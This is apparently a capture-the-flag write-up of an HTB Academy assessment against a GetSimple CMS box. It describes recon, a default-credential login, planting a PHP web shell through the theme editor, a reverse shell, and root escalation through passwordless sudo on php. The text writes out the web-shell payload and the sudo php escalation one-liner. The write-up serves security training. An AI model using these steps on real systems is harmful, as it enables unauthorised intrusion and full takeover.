GetSimple CMS: Skills Assessment Writeup

Category: Web Enumeration & Exploitation Target: HTB Academy skills-assessment box running GetSimple CMS

Overview:

The target exposed a web server running the GetSimple CMS. Enumeration revealed a disallowed admin path via robots.txt, which turned out to be protected by default credentials. From there, GetSimple's built-in file editor was abused to plant a PHP web shell, which was upgraded to a full reverse shell. Privilege escalation was a straightforward sudo misconfiguration allowing php to run as root.

Reconnaissance:

Started with a standard Nmap scan using -sC -sV to get default script output and service/version detection on all open ports.

<img width="542" height="50" alt="image" src="https://github.com/user-attachments/assets/da66a308-c63f-408e-8b48-9fd4dcf0b79b" />


This confirmed a web server on port 80.

Web Footprinting:

Used whatweb and curl to fingerprint the web technology stack and inspect page headers/source for hints.

<img width="624" height="100" alt="Untitled design (2)" src="https://github.com/user-attachments/assets/54c41bc7-9a75-4daa-8915-8f7ae332444a" />



This identified the CMS as GetSimple, and the page source pointed to a /admin/ path disallowed in robots.txt.

Directory Brute-Forcing:

Ran Gobuster to enumerate hidden files and directories beyond what robots.txt disclosed:

<img width="975" height="67" alt="image" src="https://github.com/user-attachments/assets/a4523017-b2f6-4c1e-9217-ab4a9188dc20" />


This surfaced additional exposed data files, which were pulled directly with curl.

Foothold:

Since /admin/ was explicitly disallowed in robots.txt, that was the first place to check manually: http://target_ip/admin.

<img width="404" height="378" alt="image" src="https://github.com/user-attachments/assets/680af34e-de35-47a0-b0ed-8e718233f302" />


Logged in using the default credentials admin:admin, with no lockout or rate limiting in place.

Once authenticated, the admin panel exposed:

The GetSimple version number (useful for looking up known CVEs)

<img width="356" height="44" alt="image" src="https://github.com/user-attachments/assets/cb4a5c28-15bb-4018-a150-daa79d3b55f1" />

A built-in theme/file editor, a classic path to remote code execution in CMS platforms
<img width="975" height="407" alt="image" src="https://github.com/user-attachments/assets/1973caa3-4532-46ab-9f14-accd964500c3" />

Exploitation:
Used the theme editor to plant a PHP web shell (<?php system($_GET['cmd']); ?>-style payload) inside a page template, then hit that page directly to confirm code execution.

<img width="534" height="64" alt="image" src="https://github.com/user-attachments/assets/8ed184d4-6f07-48e0-992a-effb9f6ef65a" />

Converted the web shell into a full reverse shell payload, URL-encoded it (needed for the web server to interpret it correctly), started a listener, and triggered it:
<img width="975" height="54" alt="image" src="https://github.com/user-attachments/assets/326cbecc-48fa-4297-9fbd-f077068f4707" />
(Coverting web shell into reverse shell)
<img width="975" height="107" alt="image" src="https://github.com/user-attachments/assets/cfab5529-a336-4ac5-81db-78829cf36817" />
(URL-encoded)

<img width="278" height="50" alt="image" src="https://github.com/user-attachments/assets/77706987-8279-44c6-a682-7049cafa4bae" />

(Started listener)
<img width="975" height="81" alt="image" src="https://github.com/user-attachments/assets/8dca26e7-998e-40b9-9043-33940d3ce5ba" />
(Triggered it)

Caught the shell, upgraded it to a fully interactive TTY, and located the user flag.
<img width="975" height="124" alt="image" src="https://github.com/user-attachments/assets/2d5b8a7c-7be6-404d-8860-e8a146218321" />

Privilege Escalation:

Checked for sudo misconfigurations

sudo -l

This revealed the local user could run /usr/bin/php as root with no password.
<img width="486" height="61" alt="image" src="https://github.com/user-attachments/assets/523b0639-470a-45c7-bbd6-722b24f97626" />

Exploitation:

sudo php -r "system('/bin/bash');"
<img width="975" height="165" alt="image" src="https://github.com/user-attachments/assets/0bc3906e-f616-4da2-90a2-30c20967a303" />

Since PHP was executing as root, the spawned bash shell inherited root privileges. Confirmed with id, then read the root flag:

cat /root/root.txt

<img width="624" height="56" alt="Untitled design" src="https://github.com/user-attachments/assets/d917f900-5ca0-4897-9463-b07c1b0097f4" />


Reasoning / Chain Summary: 
1. Open web port → identified CMS (GetSimple) via fingerprinting
2. CMS identification → found exposed data files via directory brute force
3. Weak default credentials (admin:admin) → admin panel access
4. Admin panel's built-in file editor → planted a web shell → code execution
5. Code execution → reverse shell → user flag
6. Sudo misconfiguration (php as root, no password) → privilege escalation → root flag

Each stage fed directly into the next, a textbook example of how a single weak credential can cascade into full compromise when combined with an overly permissive admin feature.

Tools Used:
- nmap
- whatweb
- curl
- gobuster
- netcat (nc)
- Bash

Lessons Learned:

1. Default credentials remain one of the most common real-world entry points, even on hardened-looking targets.
2. CMS "convenience" features (theme/file editors) are frequently a direct path to RCE if authentication around them is weak.
3. Always check sudo -l early in privilege escalation enumeration. Misconfigured NOPASSWD entries on interpreters (php, python, perl, etc.) are an easy escalation path.
